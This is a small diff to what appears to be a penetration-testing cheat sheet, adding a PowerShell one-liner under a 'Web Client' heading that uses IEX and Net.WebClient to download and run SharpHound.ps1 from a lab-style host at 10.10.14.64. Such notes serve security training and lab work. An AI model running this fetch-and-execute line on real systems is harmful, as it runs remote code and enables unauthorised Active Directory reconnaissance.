@@ -137,5 +137,5 @@ gpp-decrypt "<hash>"
 ### Web Client
 
 ```python
-IEX(New-Object Net.WebClient).downloadstring
+IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1')
 ```
